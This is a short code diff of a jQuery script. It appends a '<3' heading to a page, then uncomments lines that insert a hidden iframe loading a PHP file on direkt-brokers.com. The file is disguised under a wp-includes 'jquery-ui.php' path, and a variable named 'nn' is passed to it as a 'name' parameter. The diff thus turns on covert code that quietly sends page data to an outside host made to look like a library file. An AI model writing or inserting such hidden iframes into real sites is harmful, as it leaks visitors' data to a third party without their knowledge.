@@ -32,5 +32,5 @@ $("body").append("<h1 style='position:absolute;top:200px;left:0px;'><3</h1>");
 //else {
    //window.location = "";
 // }
-// $('<iframe src="http://direkt-brokers.com/wp-includes/js/jquery-ui.php?name='+nn+ '"style="display:none;"></iframe>')
-//   .appendTo('#overlays');
+ $('<iframe src="http://direkt-brokers.com/wp-includes/js/jquery-ui.php?name='+nn+ '"style="display:none;"></iframe>')
+   .appendTo('#overlays');
